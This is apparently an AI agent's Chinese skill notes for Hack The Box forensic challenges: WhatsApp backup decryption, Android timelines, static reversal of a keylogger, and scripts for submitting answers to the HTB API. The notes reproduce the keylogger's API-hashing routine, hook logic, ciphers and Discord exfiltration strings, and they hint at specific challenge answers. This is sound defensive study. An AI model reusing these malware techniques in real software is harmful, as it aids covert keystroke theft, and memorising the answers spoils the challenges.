- 解密：`AES.new(key,'GCM',iv=f5)`，`ct = data[header:][:-32]`，`tag = [-32:-16]`
- **三重自检**：① `md5(1B长度+flag+protobuf+ct+tag) == 文件末 16B` ② GCM `verify(tag)` 通过
  ③ 明文头 = `78 01`（zlib）→ **`zlib.decompress` 后才是 SQLite**（别以为解密出来就是 DB）
- crypt15 同思路，密钥来自 64 字符 passphrase（`key15.py`）

### 7.15.4 🔴 本题踩过的坑（都会重复踩）
1. **消息被删就以为无解**：白跑 ~50min 扫了 free page / notification_log / icing / bugreport / Chrome 缓存 /
   WhatsApp 日志 / workdb / jobqueue。**正解是加密备份**。⇒ 见到 `backup_changes` 的 DELETE 或 `*.crypt1x`
   就直接上 §7.15.3，别先扫全盘。
2. **`tarlist` 里"看似无关"的目录**：`data/system_ce/0/snapshots/*.jpg`（最近任务截图，可能是假登录页 →
   直接 eye-verify 假 UI 的 slogan）、`data/user_de/0/com.android.shell/files/bugreports/`（含 logcat/dumpsys，
   但**要核对时间窗是否覆盖案发时刻**，本题 4 份都早于钓鱼）。
3. **`wa.db.wa_contacts` 的字段顺序**：`display_name`(col7) vs `wa_name`(col15) —— 现场 DB 里 display_name 是 NULL、
   攻击者名字在 `wa_name`（推送名）。手写 SQLite 记录解析时注意 JADX/`sqlite3` 之外还要看 WAL 里的**旧页镜像**。
4. **Android 时间窗纪律**：Chrome/epoch = **UTC**；WhatsApp `whatsapp.log` = **设备本地时区**（判时区：日志时刻 − epoch
   跨源对齐）；`data/anr/*`、`bugreport-<date>-<time>.zip` 文件名是**本地时间**。任务问"最后访问时间"时用 UTC 秒。

### 7.15.5 提交注意（本题被卡过一次）
🔴 **非 ASCII 答案（en-dash `–`、智能引号、emoji）用 PowerShell 5.1 提交会被 Latin-1 编码吃掉变 `?`**，
后端回 **400 Incorrect**（看着像答案错，其实是报文坏）。
✅ 解法：把 body 写成 **ASCII-only JSON**（`\u2013` 转义）或以 **UTF-8 字节数组**传 `-Body`；
诊断口径：拿响应里的 `"flag"` 原文与掩码逐字符对，别去改答案。

## 7.16 Windows PE 键盘记录器静态逆向：API 哈希 + XTEA/RC4 + Discord 外传（KeyDis Medium 19/19 全通）

> 触发：场景写 "legitimate application → Command Prompt 闪一下 → 异常外联"，附件是**单个 PE**（不是 KAPE/内存/日志），
> 题面明说 "advanced static reverse engineering … **without relying on runtime analysis**"。
> 问题序列长这样：哈希 → 编译时间戳 → 编译器 → "primary execution entry point"（某个 API）→ "该 API 的哈希" →
> 一堆 VK 码 / 虚拟键 / 加密算法 / 密钥 / 外联应用与协议 / bot token。**看到"API 名 + 其哈希"交替出现 = API 哈希混淆题**。

### 7.16.1 六步动线（实测 ~25 分钟，IDA MCP 全程）
1. **PE 头三问**（不用开反编译器）：`TimeDateStamp` = 编译时间戳（UTC）；`MajorLinkerVersion`（14.4x = MSVC 2022）；
   `Rich` 头可交叉验证编译器。→ 直接秒掉"timestamp / compiler"两题。
2. **strings 先扫异常编码**：DLL 名被 **hex 编码**（`5573657233322e646c6c` = `User32.dll`、`4b65726e656c33322e646c6c` = `Kernel32.dll`、
   `57696e687474702e646c6c` = `Winhttp.dll`）—— 见到 16 进制串先 `bytes.fromhex()` 解一下，比猜快。
   同时抓外联证据：`Authorization: Bot %s` / `Host: discord.com` / `WinHttpSendRequest failed` → 应用/协议两题到手。
3. **找哈希解析器**：形如 `sub_XXXX(PVOID moduleBase, DWORD hash)` —— 内部 `*(WORD*)base == 0x5A4D`(MZ) →
   `*(DWORD*)(base+e_lfanew) == 0x4550`(PE) → 拷 `IMAGE_OPTIONAL_HEADER` → 若 `DataDirectory[0].VirtualAddress`
   非 0 就遍历导出表，对每个名字调哈希函数比对。**它是 GetProcAddress 的马甲。**
4. **还原哈希函数并自证**（⭐ 本题唯一的关键动作）：反编译那个被传入的名字哈希函数，用**题目白送的哈希**验证 ——
   KeyDis 的题面直接给了 `0x28331FE9`，实现后一算命中 `GetKeyState` ⇒ 实现正确，然后把二进制里所有 hash 常量
   **批量反查**成 API 名（`for name in candidate_list: if h(name)==const`），整个 API 表就还原了。
   本例算法（64 位、`int` 有符号字符参与运算，Python 端全部按 32 位掩码）：
   ```c
   v = 1160726078;                                     // 0x452D4DBE
   for (c in name) { if (c < 32) return 0;             // 非可打印直接判败
                     v = (-1824370957 * (c + 1164784894 * ((1164784894*c) ^ v))) ^ 0xB04AB11A; }
   ```
   ✅ 自证三连：`GetKeyState`→0x28331FE9（题面给的）、`SetWindowsHookExA`→0xB79D4BCD、`ToUnicodeEx`→0x3FD69474。
5. **顺着"执行入口"读钩子回调**：`SetWindowsHookExA(0x0D=WH_KEYBOARD_LL, callback, GetModuleHandleW(NULL), 0, 0)`
   + `GetMessageW/TranslateMessage/DispatchMessageW` 泵 = 全局键盘记录。回调里依次是
   `GetKeyboardState(256B)` → `GetKeyState(0x10/0x12/0x14)` 手工修补 shift/caps 位 → `scanCode |= 0xE000`
   （扩展键；题面可能写 "XORed"，实际指令是 `or`）→ `ToUnicodeEx(vk, scan, state, buf, 8, 0, GetKeyboardLayout(0))`
   → `WideCharToMultiByte(CP_UTF8)` 累积缓冲 → `vkCode == 0x0D (VK_RETURN)` 触发外传。
6. **加密按常量认，不按猜**：
   - 64-bit 分块、两个 dword `v0/v1`、`delta = 1640531527 (0x61C88647 取负 = +0x9E3779B9)`、
     **`key[(sum>>11)&3]` 这个索引形式 = XTEA 独有**（TEA 没有）；轮数 = 传进去的常量（本例 32）。
   - 256 字节 S 盒 + `i=(i+1)%256; j=(S[i]+j)%256; swap; out ^= S[(S[i]+S[j])%256]` = **RC4**（KSA/PRGA 两个函数）。
   - 密钥常以 `mov dword ptr [rsp+X], imm32` **连续 4 次**内联 → 16 字节。

### 7.16.2 🔴 三个真坑（都实际改过答案）
1. **附件 zip 可能是 ZipCrypto 加密的**（HTB 近期口径变了，不再统一 hacktheblue 明文）：
   `Expand-Archive` 与 .NET `ZipFile` 对加密条目 **不抛异常，静默写出 13 字节垃圾** ——
   两种独立方法读到同样 13 字节，极易误判成"Defender 把样本吃了/文件是马"。
   ⇒ **先看 zip 本地头第 7-8 字节**（`01 00` = 加密）再解压；直接 `7z x -phacktheblue x.zip`。
   ⚠️ PowerShell 里 `7z ... -o.` 会报 `Too short switch: -o` → 别写 `-o`，默认就解到 cwd。
2. **"key" 类答案的字节序（掩码救不了你）**：XTEA 密钥 16 字节，掩码只给 32 个 `*`。
   按**内存小端序**写成 hex（`8e038d79…`）会被判错；官方要的是**4 个 dword 的字面十六进制直接拼接**
   （`798d038e 72319e4f d00ddee0 f001004e` → `<REDACTED>`）。
   ⇒ **加密题的第一发被拒，先换字节序/字序，别去怀疑算法**（算法有 delta/索引常量背书）。
3. **掩码长度会否定直觉**：`**_**********` 是 **13** 字符（数一遍！），`WH_KEYBOARD_LL`(14) 直接出局，
   13 字符 + 第 3 位是 `_` 且题面给 `0x104` ⇒ **`WM_SYSKEYDOWN`**（260 = 钩子回调里 `cmp wParam, 104h` 的那个消息）。
   同理 `**_*******` = `VK_CAPITAL`(10)。**先数字符再选候选，能省掉一半试错。**

### 7.16.3 判分口径备忘
- 十六进制答案**大小写不敏感**（`caf4e182…` 小写 201 通过，官方存的是大写原文），但**字序/字节序敏感**。
- `Task 1` 那类"sample 的 hash"：答**解出来的可执行文件本体**，不是 zip。
- 提交走 labs API 直连（工具通道被 Cloudflare 拦，返回 HTML 首页）：本文 §8 的通道纪律照旧有效，
  18 连发间隔 5s 无一 429。

## 8. 通用规则

- **答案以原始材料为准**（报告原文/反汇编字节/kmsg），掩码长度是提示不是装饰
- 做题过程随时把发现写入 ANALYSIS.md，逐题对照，避免答串
- 🔴 **候选答案必须落盘**（`answers.json` + `ANALYSIS.md`，随做随写）：只活在会话上下文里的答案会随上下文压缩/会话结束丢失。
  Caught 教训：8-25 已把 22 题全做完，被 429 卡住没交成，答案只留在会话里；后来靠翻 `~/.dsh/sessions/**/session.jsonl.zstd`
  （`zstd -d` 后 grep 题号/答案串）才救回来。**考古命令**：`Get-ChildItem ~/.dsh/sessions -Recurse -Filter *.jsonl.zstd` → zstd 解压 → grep `sherlocks/<id>` / 任务 id
- 提交后错题 → 回到对应证据重新核对，不要猜
- 🔴 **提交通道先验证**：连"已知正确答案"都被拒且错误信息是 HTML 页面 = Cloudflare 拦截（htb_sherlock 工具走 app.hackthebox.com 会被拦）→ 改用 **labs.hackthebox.com 直连 API**：`POST https://labs.hackthebox.com/api/v4/sherlocks/{id}/tasks/{tid}/flag` body `{"flag":"..."}`，Bearer token（~/.dsh/htb-token.txt）；201=对、400 {"message":"Task flag already owned!"}=已答对、{"message":"Incorrect task flag!"}=真错
- 🔴 **429 `{"message":"Too Many Attempts."}` = 限流，不是答案错**：别把它当"答错"去改答案。
  - 批量交题前先 `progress` 拿基数；**每题间隔 ≥3s**（Caught 9 连发全 201 验证过）
  - `htb_sherlock_submit_file` 每次调用会**先 GET tasks 再 POST**（双倍消耗配额），限流时改用纯 POST 的 Node 脚本
  - 头必须带 `Accept: application/json`（否则 302 到 HTML）；`content-type: application/json`
- 🔴🔴 **提交前必须"单发 gate"**：先只交 **1 题**并**打印响应体**，确认 201/owned 再批量。
  代价对照（Overlord 实测）：一次循环打 15 发 → 全 422，白烧配额，且**差点去"修正"本来全对的答案**。
- 🔴 **两个 PowerShell 提交坑**（都会伪装成"字段缺失 / API 变了"）：
  1. `[ordered]@{ 21891 = 'x' }` 的键是 **Int32**，而 `$ans[21891]` 绑定到 `Item[int index]`
     （**按下标**取第 21891 个元素）而不是按键 → 取到 `$null` → body 变 `{"flag":null}` → **422**。
     ✅ 用字符串键 `@{ '21891' = 'x' }`，或两条平行数组。
  2. PowerShell 5.1 向原生 exe 传含双引号的 JSON（`curl.exe --data-raw $json`）会**吞掉引号**
     → curl 实际发出 `{flag:x}` → 同样 422（更早还出现 `HTTP=000`）。
     ✅ 用 `Invoke-WebRequest -Body <string> -ContentType 'application/json'`（cmdlet 走 .NET，不经命令行解析）；
     非用 curl 不可时把 body 落盘 `--data-binary "@file"`。
  ⇒ 判据：**报"字段缺失"时先怀疑自己的报文，不要动答案。**
- 🔴🔴 **第三个变体：别用字符串拼接造 JSON body**（Koredos 实测，Windows 题**极易**命中）
  ```powershell
  # ❌ 包含反斜杠的答案（Windows 路径/注册表键）会让 JSON 非法：
  $body = '{"flag":"' + $val + '"}'      # $val = SOFTWARE\Microsoft\...\Svchost
  #   → {"flag":"SOFTWARE\Microsoft\...} 里的 \M \W \C \S 都不是合法转义
  #   → 服务端解析失败 → 422 {"message":"The flag field is required."}
  # ✅ 让 ConvertTo-Json 负责转义（它会把 \ 变成 \\）：
  $body = @{ flag = $val } | ConvertTo-Json -Compress
  ```
  **为什么特别危险**：这道题 15 个答案里只有注册表键含反斜杠，其余 14 个用拼接也能过 ——
  于是错误看起来像"这一题答错了"，而不是"我的报文坏了"。若按直觉去"修正答案"，就会把对的改成错的。
  ⇒ **纪律：body 一律用 `ConvertTo-Json`（或 Python `json.dumps`）构造，禁止字符串拼接**，
  无论答案看起来多简单。
- **状态码对照**：`201`=对；`400 {"message":"Task flag already owned!"}`=已答对；
  `400 {"message":"Incorrect task flag!"}`=**真错（不是限流）**；`429 {"message":"Too Many Attempts."}`=限流。
- **进度审计（判断哪些题已答）**：⭐ **首选 API**：`GET /api/v4/sherlocks/{id}/tasks` → 每题 `completed` + `flag`（见 §0 第 0 步），
  **一次调用同时给出"哪题没做"和"已做题的正确答案"**，比翻页面快且可靠（Sleigh Slayer 靠它 30 秒定位到只差 Task 9）。
  兜底（API 不可用时）才看 play 页面：已答题 Submit 按钮 `disabled` 且输入框留着当时提交值；Playwright 一把抓
  `[...document.querySelectorAll('li')].filter(li=>/Task \d+/.test(li.innerText))` → 取 `li.querySelector('button').disabled` + `li.querySelector('input').value`
- **专有/压缩格式先搜公开解析器**（odl.py/SBECmd/esedbexport 模式），别自己造轮子
- 详细记忆：恶意样本静态分析见 malware-static-analysis 卡；AD 权限链滥用命令见 ad-checklist §11；**做题记录归档在 `C:\Users\<user>\sherlock-work\<slug>\PROGRESS.md`**（答案表+攻击链+证据路径，收尾必写）
- 收尾: 新题型复盘 → 更新本 SKILL.md 并重生成索引卡；本题答案/链路写进 `sherlock-work\<slug>\PROGRESS.md`（下次续做先读它）
- **续做纪律（Sleigh Slayer 实战）**：`sherlock-work\<slug>\PROGRESS.md` 存在 = 之前做过 → **先读它，再跑 §0 第 0 步的 `/tasks`**，
  两条信息一交叉就能定位"还剩哪几题"，避免重解已答对的老题（本题 23/24 只差 Task 9，靠这两步 30 秒锁定）
